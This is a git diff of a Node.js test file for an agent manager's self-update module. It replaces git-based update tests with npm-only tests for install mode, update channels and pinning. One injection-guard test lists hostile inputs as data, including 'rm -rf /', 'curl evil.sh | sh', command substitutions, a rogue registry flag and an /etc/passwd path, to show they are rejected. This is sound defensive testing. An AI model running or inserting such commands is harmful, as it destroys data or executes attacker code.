@@ -1,323 +1,162 @@
-// Self-update branch-adoption tests (ticket dc38dce6). Exercises the real git
-// machinery against throwaway repos so the structural fix — adopting
-// origin/<branch> via `git fetch` + `git checkout --detach` instead of
-// `git checkout <branch>` + `git pull --ff-only` — is proven against the exact
-// field condition that self-locked the manager: a ticket worktree holding the
-// default branch checked out while self-update runs in the shared base repo.
+// Self-update tests. npm is the ONLY distribution channel — the manager never
+// fetches/checks-out/builds from a git remote to update itself. The retired
+// 'git' install mode (and its adoptRemoteBranch / detectRepoRoot /
+// computeGitUpdateState machinery, plus the separate git-mode-update suite) was
+// removed; what remains to prove here is:
+//   - install-mode classification collapses to npm-global vs unknown;
+//   - the update channel resolves safely (including the injection guard) and
+//     reaches UpdateStatus;
+//   - channel 'off' pins the build — no checker, no self-update;
+//   - the embedded npm-global updater helper still parses.
 
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import { promises as fsp } from 'node:fs';
-import { join, basename } from 'node:path';
+import { join } from 'node:path';
 import { tmpdir } from 'node:os';
 import { execFileSync } from 'node:child_process';
 
 import {
-  adoptRemoteBranch,
-  detectRepoRoot,
   classifyInstallMode,
   detectInstallMode,
+  resolveUpdateChannel,
+  isAutoUpdateDisabled,
+  runSelfUpdate,
+  _resetSelfUpdateInFlightForTests,
+  UPDATE_CHANNEL_ENV,
+  UPDATE_CHANNEL_OFF,
   UpdateChecker,
   _npmGlobalUpdaterSourceForTests,
 } from '../dist/lib/self-update.js';
 
-function git(cwd, args) {
-  return execFileSync('git', ['-C', cwd, ...args], { encoding: 'utf8' }).trim();
-}
+// ─── install mode ───────────────────────────────────────────────────────────
+// Reachable npm → npm-global (auto-updatable via `npm i -g`); no npm → unknown
+// (manual upgrade only). classifyInstallMode is the pure core, so the decision
+// is testable without spawning npm; detectInstallMode wires the real probe.
 
-// Like git() but never throws — used to assert that a command FAILS.
-function gitTry(cwd, args) {
-  try {
-    return { ok: true, out: git(cwd, args) };
-  } catch (e) {
-    return { ok: false, out: String(e?.stderr || e?.stdout || e?.message || e) };
-  }
-}
+test('classifyInstallMode: reachable npm → npm-global', () => {
+  assert.equal(classifyInstallMode('/usr/lib/node_modules'), 'npm-global');
+  // A locally-packed tarball installed to a custom prefix is still npm-managed.
+  assert.equal(classifyInstallMode('/home/me/.npm-global/lib/node_modules'), 'npm-global');
+});
 
-function commit(repo, file, content, msg) {
-  // writeFileSync via execFileSync's sibling — keep it sync to match git() flow.
-  execFileSync('node', ['-e', `require('fs').writeFileSync(${JSON.stringify(join(repo, file))}, ${JSON.stringify(content)})`]);
-  git(repo, ['add', '.']);
-  git(repo, ['commit', '-q', '-m', msg]);
-  return git(repo, ['rev-parse', 'HEAD']);
-}
+test('classifyInstallMode: no npm → unknown (manual upgrade only)', () => {
+  assert.equal(classifyInstallMode(null), 'unknown');
+});
 
-/**
- * Build a bare `origin` + a `publisher` clone (mints releases) + a `manager`
- * clone (the self-updating agent-manager checkout). Mirrors the worktree-manager
- * test harness style.
- */
-async function makeCluster() {
-  const root = await fsp.mkdtemp(join(tmpdir(), 'awb-su-'));
-  const origin = join(root, 'origin.git');
-  const publisher = join(root, 'publisher');
-  const manager = join(root, 'manager');
+test('detectInstallMode: this checkout resolves npm-global (npm is on PATH in CI)', () => {
+  assert.equal(detectInstallMode(), 'npm-global');
+});
 
-  execFileSync('git', ['init', '-q', '--bare', '-b', 'main', origin]);
+// ─── update channel ─────────────────────────────────────────────────────────
 
-  execFileSync('git', ['clone', '-q', origin, publisher]);
-  git(publisher, ['config', 'user.email', 'pub@awb.local']);
-  git(publisher, ['config', 'user.name', 'AWB Publisher']);
-  commit(publisher, 'README.md', '# v1\n', 'v1');
-  git(publisher, ['push', '-q', 'origin', 'main']);
+test('resolveUpdateChannel: defaults to latest', () => {
+  assert.equal(resolveUpdateChannel(''), 'latest');
+  assert.equal(resolveUpdateChannel(null), 'latest');
+  assert.equal(resolveUpdateChannel('   '), 'latest');
+});
 
-  execFileSync('git', ['clone', '-q', origin, manager]);
-  git(manager, ['config', 'user.email', 'mgr@awb.local']);
-  git(manager, ['config', 'user.name', 'AWB Manager']);
+test('resolveUpdateChannel: accepts dist-tags and exact versions', () => {
+  assert.equal(resolveUpdateChannel('next'), 'next');
+  assert.equal(resolveUpdateChannel('beta'), 'beta');
+  assert.equal(resolveUpdateChannel('1.6.99'), '1.6.99');
+  assert.equal(resolveUpdateChannel('1.7.0-rc.1'), '1.7.0-rc.1');
+  assert.equal(resolveUpdateChannel('  next  '), 'next', 'surrounding whitespace is trimmed');
+});
 
-  return {
-    root,
-    origin,
-    publisher,
-    manager,
-    cleanup: () => fsp.rm(root, { recursive: true, force: true }),
-  };
-}
+test('resolveUpdateChannel: off is recognized case-insensitively', () => {
+  assert.equal(resolveUpdateChannel('off'), UPDATE_CHANNEL_OFF);
+  assert.equal(resolveUpdateChannel('OFF'), UPDATE_CHANNEL_OFF);
+  assert.equal(isAutoUpdateDisabled(resolveUpdateChannel('off')), true);
+  assert.equal(isAutoUpdateDisabled(resolveUpdateChannel('latest')), false);
+});
 
-test('adoptRemoteBranch updates the tree even when a worktree holds the default branch', async () => {
-  const c = await makeCluster();
-  try {
-    // Reproduce the field condition: the manager's primary tree sits on
-    // production.private, and a ticket worktree holds `main` checked out.
-    git(c.manager, ['checkout', '-q', '-b', 'production.private']);
-    const wt = join(c.root, 'mgr-wt');
-    git(c.manager, ['worktree', 'add', '-q', wt, 'main']);
-
-    // Sanity: the OLD self-update step (`git checkout main`) is exactly what
-    // self-locked the manager — git refuses because main is held by the wt.
-    const bug = gitTry(c.manager, ['checkout', 'main']);
-    assert.equal(bug.ok, false, 'git checkout main must fail while a worktree holds main');
-    assert.match(bug.out, /already used by worktree|already checked out/i);
-
-    // Publish a new release to origin/main.
-    const newSha = commit(c.publisher, 'VERSION', '0.9.1\n', 'v2 release');
-    git(c.publisher, ['push', '-q', 'origin', 'main']);
-
-    const prodShaBefore = git(c.manager, ['rev-parse', 'production.private']);
-
-    // The fix: fetch + detached checkout. Must succeed despite the worktree.
-    const logs = [];
-    const res = await adoptRemoteBranch(c.manager, 'main', (m) => logs.push(m));
-    assert.equal(res.ok, true, `adopt should succeed; got ${JSON.stringify(res)}`);
-
-    // HEAD is detached (no branch ref held → cannot collide with the worktree).
-    const headIsBranch = gitTry(c.manager, ['symbolic-ref', '-q', 'HEAD']);
-    assert.equal(headIsBranch.ok, false, 'primary HEAD must be detached after adopt');
-
-    // HEAD now points at the freshly published commit, and its file is present.
-    assert.equal(git(c.manager, ['rev-parse', 'HEAD']), newSha, 'adopted the new release commit');
-    // Windows git checkout 은 core.autocrlf 로 LF→CRLF 변환하므로 개행 정규화 후 비교 (ticket e09fa003).
-    assert.equal((await fsp.readFile(join(c.manager, 'VERSION'), 'utf8')).replace(/\r\n/g, '\n'), '0.9.1\n');
-
-    // The unrelated local branch was NOT moved (the `git reset --hard` hazard
-    // the detached checkout deliberately avoids).
-    assert.equal(
-      git(c.manager, ['rev-parse', 'production.private']),
-      prodShaBefore,
-      'production.private ref must be untouched',
-    );
-
-    // The ticket worktree holding main is left intact. `git worktree list`
-    // prints forward-slash, realpath-canonicalized paths, whereas `wt` is a
-    // backslash `join()` path rooted at os.tmpdir() — on the windows-latest
-    // runner that tmpdir is an 8.3 short path (C:\Users\RUNNER~1\…) which git
-    // expands to the long form, so a full-path `.includes` mismatches on
-    // separators AND on the short/long-name and drive-case differences. Assert
-    // on the unambiguous worktree basename instead (ticket e09fa003).
-    assert.ok(
-      git(c.manager, ['worktree', 'list']).includes(basename(wt)),
-      'worktree still registered',
-    );
-  } finally {
-    await c.cleanup();
+// The channel is interpolated into an `npm view` / `npm install -g` spec that
+// runs with shell:true on Windows, so a hostile env value must never survive
+// into the command. Anything outside the npm dist-tag/version charset falls
+// back to the default channel rather than being passed through.
+test('resolveUpdateChannel: rejects shell/argument injection attempts', () => {
+  for (const evil of [
+    'latest; rm -rf /',
+    'latest && curl evil.sh | sh',
+    'latest`whoami`',
+    'latest $(id)',
+    '--registry=https://evil.example',
+    '../../etc/passwd',
+    'latest\nnpm i -g evil',
+    'latest evil-package',
+    '@scope/evil',
+    '-latest',
+  ]) {
+    assert.equal(resolveUpdateChannel(evil), 'latest', `must not pass through: ${JSON.stringify(evil)}`);
   }
 });
 
-test('adoptRemoteBranch is a no-op-safe detach when already on the default branch', async () => {
-  const c = await makeCluster();
-  try {
-    // Primary on main (the clone default). Publish a new commit, then adopt.
-    const newSha = commit(c.publisher, 'CHANGELOG.md', 'v2\n', 'v2');
-    git(c.publisher, ['push', '-q', 'origin', 'main']);
-
-    const res = await adoptRemoteBranch(c.manager, 'main', () => {});
-    assert.equal(res.ok, true);
-    assert.equal(git(c.manager, ['rev-parse', 'HEAD']), newSha, 'fast-forwarded to new commit');
-    const headIsBranch = gitTry(c.manager, ['symbolic-ref', '-q', 'HEAD']);
-    assert.equal(headIsBranch.ok, false, 'ends on a detached HEAD regardless of start state');
-  } finally {
-    await c.cleanup();
-  }
-});
-
-test('adoptRemoteBranch surfaces a structured failure when the branch cannot be fetched', async () => {
-  const c = await makeCluster();
-  try {
-    const res = await adoptRemoteBranch(c.manager, 'no-such-branch', () => {});
-    assert.equal(res.ok, false);
-    assert.match(res.summary, /git fetch failed/);
-  } finally {
-    await c.cleanup();
-  }
-});
-
-// ─── detectRepoRoot false-positive hardening (ticket bc306b8d) ──────────────
-// A bare `.git` test used to accept ANY ancestor repo, so an `npm i -g`
-// install nested under a home dotfiles repo (or any git-tracked prefix) latched
-// onto that foreign checkout. The self-update fetch then failed against a repo
-// with no apps/agent-manager/package.json, and the admin badge showed a scary
-// "(update check failed)" on what is really a plain npm-global install that
-// should read "(manual updates only)". The guard now requires the `.git` dir to
-// be OUR monorepo (apps/agent-manager/package.json with name awb-agent-manager).
-
-// Write apps/agent-manager/package.json under `dir` with the given package name.
-async function writePkg(dir, name) {
-  await fsp.mkdir(join(dir, 'apps', 'agent-manager'), { recursive: true });
-  await fsp.writeFile(
-    join(dir, 'apps', 'agent-manager', 'package.json'),
-    JSON.stringify({ name, version: '9.9.9' }),
-  );
-}
-
-// Create `dir` with a `.git` marker — a directory (normal clone) or a file
-// (git worktree / submodule `gitdir:` pointer). Both must be accepted.
-async function makeGitMarker(dir, type /* 'dir' | 'file' */) {
-  await fsp.mkdir(dir, { recursive: true });
-  if (type === 'file') {
-    await fsp.writeFile(join(dir, '.git'), 'gitdir: /elsewhere/worktrees/x\n');
-  } else {
-    await fsp.mkdir(join(dir, '.git'), { recursive: true });
-  }
-}
-
-test('detectRepoRoot never adopts an arbitrary AWB development checkout', async () => {
-  const root = await fsp.mkdtemp(join(tmpdir(), 'awb-dr-'));
-  try {
-    const repo = join(root, 'ai-workflow-board');
-    await makeGitMarker(repo, 'dir');
-    await writePkg(repo, 'awb-agent-manager');
-    // Seed from where the running dist/ actually lives, deep under the repo.
-    const seed = join(repo, 'apps', 'agent-manager', 'dist', 'lib');
-    await fsp.mkdir(seed, { recursive: true });
-    assert.equal(detectRepoRoot(seed), null);
-  } finally {
-    await fsp.rm(root, { recursive: true, force: true });
-  }
-});
-
-test('detectRepoRoot returns null for an npm-global install under an unrelated dotfiles .git', async () => {
-  const root = await fsp.mkdtemp(join(tmpdir(), 'awb-dr-'));
-  try {
-    // Foreign dotfiles repo: has .git but NOT our apps/agent-manager/package.json.
-    const home = join(root, 'home');
-    await makeGitMarker(home, 'dir');
-    // Manager installed globally beneath it (npm prefix).
-    const seed = join(home, 'node_modules', 'awb-agent-manager', 'dist', 'lib');
-    await fsp.mkdir(seed, { recursive: true });
-    assert.equal(detectRepoRoot(seed), null);
-  } finally {
-    await fsp.rm(root, { recursive: true, force: true });
-  }
-});
-
-test('detectRepoRoot rejects a foreign repo whose apps/agent-manager/package.json is a DIFFERENT package', async () => {
-  const root = await fsp.mkdtemp(join(tmpdir(), 'awb-dr-'));
-  try {
-    // A monorepo that happens to have the same subpath but is not us.
-    const other = join(root, 'someone-else');
-    await makeGitMarker(other, 'dir');
-    await writePkg(other, 'not-awb-agent-manager');
-    const seed = join(other, 'apps', 'agent-manager', 'dist', 'lib');
-    await fsp.mkdir(seed, { recursive: true });
-    assert.equal(detectRepoRoot(seed), null);
-  } finally {
-    await fsp.rm(root, { recursive: true, force: true });
-  }
-});
-
-test('detectRepoRoot ignores nested AWB development checkouts', async () => {
-  const root = await fsp.mkdtemp(join(tmpdir(), 'awb-dr-'));
-  try {
-    const home = join(root, 'home');
-    await makeGitMarker(home, 'dir'); // foreign dotfiles .git above the clone
-    const repo = join(home, 'ai-workflow-board');
-    await makeGitMarker(repo, 'file'); // AWB checkout with a worktree-style .git FILE
-    await writePkg(repo, 'awb-agent-manager');
-    const seed = join(repo, 'apps', 'agent-manager', 'dist', 'lib');
-    await fsp.mkdir(seed, { recursive: true });
-    assert.equal(detectRepoRoot(seed), null);
-  } finally {
-    await fsp.rm(root, { recursive: true, force: true });
-  }
-});
-
-// ─── install-mode detection (ticket 9c9b52eb) ───────────────────────────────
-// npm-global installs (repo_root === null but running under `npm root -g`) must
-// now be classified 'npm-global' so self-update works via `npm i -g` instead of
-// falling back to "manual updates only". classifyInstallMode is the pure core
-// (no git/npm spawn) so the git vs npm-global vs unknown decision is testable
-// deterministically; detectInstallMode wires the real detectors on top.
-
-test('classifyInstallMode: npm wins over a legacy checkout when available', () => {
-  assert.equal(classifyInstallMode('/anywhere', '/repo', '/usr/lib/node_modules'), 'npm-global');
-  assert.equal(classifyInstallMode('/repo/apps/agent-manager/dist/lib', '/repo', null), 'git');
-});
-
-test('classifyInstallMode: running file under `npm root -g` → npm-global', () => {
-  const npmRoot = join('/usr', 'lib', 'node_modules');
-  const here = join(npmRoot, 'awb-agent-manager', 'dist', 'lib');
-  assert.equal(classifyInstallMode(here, null, npmRoot), 'npm-global');
-  // The npm root dir itself counts as "inside".
-  assert.equal(classifyInstallMode(npmRoot, null, npmRoot), 'npm-global');
-});
-
-test('classifyInstallMode: npm availability selects npm regardless of script location', () => {
-  const npmRoot = join('/usr', 'lib', 'node_modules');
-  // A sibling that merely shares a string prefix must NOT be treated as inside.
-  assert.equal(classifyInstallMode('/usr/lib/node_modules-evil/x', null, npmRoot), 'npm-global');
-  assert.equal(classifyInstallMode('/opt/app/dist/lib', null, npmRoot), 'npm-global');
-  // No npm at all (detectNpmGlobalRoot returned null).
-  assert.equal(classifyInstallMode('/opt/app/dist/lib', null, null), 'unknown');
-});
-
-test('detectInstallMode: a real AWB checkout seed prefers npm when npm is available', async () => {
-  const root = await fsp.mkdtemp(join(tmpdir(), 'awb-im-'));
-  try {
-    const repo = join(root, 'ai-workflow-board');
-    await makeGitMarker(repo, 'dir');
-    await writePkg(repo, 'awb-agent-manager');
-    const seed = join(repo, 'apps', 'agent-manager', 'dist', 'lib');
-    await fsp.mkdir(seed, { recursive: true });
-    assert.equal(detectInstallMode(seed), 'npm-global');
-  } finally {
-    await fsp.rm(root, { recursive: true, force: true });
-  }
-});
-
-test('detectInstallMode: vendored seed still prefers available npm', async () => {
-  const root = await fsp.mkdtemp(join(tmpdir(), 'awb-im-'));
-  try {
-    // A vendored copy under tmp: no `.git` above it, and tmp is not under the
-    // CI host's `npm root -g` — so neither git nor npm-global applies.
-    const seed = join(root, 'vendor', 'awb-agent-manager', 'dist', 'lib');
-    await fsp.mkdir(seed, { recursive: true });
-    assert.equal(detectInstallMode(seed), 'npm-global');
-  } finally {
-    await fsp.rm(root, { recursive: true, force: true });
-  }
-});
-
-test('UpdateChecker constructed from the AWB dist prefers npm-global updates', () => {
-  // The real dist/lib/self-update.js sits under this checkout, so the checker's
-  // constructor (detectRepoRoot from import.meta.url) must classify it as git —
-  // proving the install-mode wiring reaches UpdateStatus. We never start() it,
-  // so no timer/network is touched.
+test('UpdateChecker: channel reaches UpdateStatus and defaults to latest', () => {
   const c = new UpdateChecker({ log: () => {} });
   const s = c.status();
   assert.equal(s.install_mode, 'npm-global');
+  assert.equal(s.update_channel, 'latest');
   assert.equal(typeof s.current_version, 'string');
-  assert.equal(s.repo_root, null, 'development checkout is never adopted as update state');
+  assert.notEqual(s.current_version, '0.0.0', 'the bundled version resolves from dist/package.json');
+  // The retired git-mode fields must be gone from the wire contract.
+  assert.equal('repo_root' in s, false);
+  assert.equal('branch' in s, false);
   c.stop();
+});
+
+test('UpdateChecker: an explicit channel is carried through', () => {
+  const c = new UpdateChecker({ log: () => {}, updateChannel: 'next' });
+  assert.equal(c.status().update_channel, 'next');
+  c.stop();
+});
+
+test('UpdateChecker: channel=off disables the poll loop entirely', () => {
+  const logs = [];
+  const c = new UpdateChecker({
+    log: (m) => logs.push(m),
+    updateChannel: UPDATE_CHANNEL_OFF,
+    installMode: 'npm-global',
+  });
+  c.start();
+  assert.match(logs.join('\n'), /auto-update disabled/i);
+  // start() must not have armed a timer — a pinned build never polls the
+  // registry, so the status stays exactly as constructed.
+  const s = c.status();
+  assert.equal(s.update_available, false);
+  assert.equal(s.latest_version, null);
+  assert.equal(s.last_checked_at, null);
+  c.stop();
+});
+
+test('UpdateChecker: install_mode=unknown disables the poll loop', () => {
+  const logs = [];
+  const c = new UpdateChecker({ log: (m) => logs.push(m), installMode: 'unknown' });
+  c.start();
+  assert.match(logs.join('\n'), /npm is not reachable/i);
+  assert.equal(c.status().last_checked_at, null);
+  c.stop();
+});
+
+// ─── self-update entry point ────────────────────────────────────────────────
+
+test('runSelfUpdate: channel=off refuses to touch the install', async () => {
+  const prev = process.env[UPDATE_CHANNEL_ENV];
+  process.env[UPDATE_CHANNEL_ENV] = UPDATE_CHANNEL_OFF;
+  _resetSelfUpdateInFlightForTests();
+  try {
+    const logs = [];
+    const r = await runSelfUpdate({ log: (m) => logs.push(m), noReExec: true });
+    assert.equal(r.changed, false);
+    assert.match(r.summary, /pins this build/);
+    assert.equal(r.willReExec, undefined);
+    // Nothing resembling an install may have been attempted.
+    assert.doesNotMatch(logs.join('\n'), /npm install -g/);
+  } finally {
+    if (prev === undefined) delete process.env[UPDATE_CHANNEL_ENV];
+    else process.env[UPDATE_CHANNEL_ENV] = prev;
+    _resetSelfUpdateInFlightForTests();
+  }
 });
 
 test('embedded npm-global updater helper source is valid ESM (node --check)', async () => {
@@ -335,21 +174,19 @@ test('embedded npm-global updater helper source is valid ESM (node --check)', as
   }
 });
 
-// ─── "manual updates only" regression (ticket c555fbb6) ─────────────────────
-// A real AWB checkout must resolve repo_root, which lands it in git install-mode
-// (see the install-mode tests above) and keeps auto-update armed — the admin
-// "(manual updates only)" badge is only for a genuine non-checkout (npm-global /
-// unknown) install. The 2026-07-14 re-investigation confirmed a checkout-run
-// manager (Rolf, /mnt/data/repositories/ai-workflow-board) resolves its root and
-// auto-updates. This test runs from an actual checkout's compiled dist/, so the
-// live UpdateChecker MUST NOT null-root — guarding against a regression that
-// flips a real checkout back to manual-only after a restart / self-update
-// re-exec.
-test('UpdateChecker ignores the real development checkout and uses npm mode', () => {
-  const status = new UpdateChecker().status();
-  assert.equal(status.repo_root, null);
-  assert.equal(status.branch, null);
-  assert.equal(status.install_mode, 'npm-global');
-  assert.equal(typeof status.current_version, 'string');
-  assert.notEqual(status.current_version, '0.0.0', 'the bundled version resolves from dist/package.json');
+// ─── git-mode removal regression ────────────────────────────────────────────
+// The whole point of the removal: no self-update code path may shell out to git
+// again. This asserts the compiled surface, so a future re-introduction fails
+// here rather than silently shipping a second distribution channel.
+test('compiled self-update carries no git invocation', async () => {
+  const src = await fsp.readFile(new URL('../dist/lib/self-update.js', import.meta.url), 'utf8');
+  assert.doesNotMatch(src, /'git'/, "self-update must not spawn git");
+  assert.doesNotMatch(src, /checkout --detach|rev-parse|origin\//, 'no git plumbing may remain');
+});
+
+test('retired git-mode exports are gone', async () => {
+  const mod = await import('../dist/lib/self-update.js');
+  for (const name of ['adoptRemoteBranch', 'detectRepoRoot', 'computeGitUpdateState']) {
+    assert.equal(mod[name], undefined, `${name} must not be exported anymore`);
+  }
 });
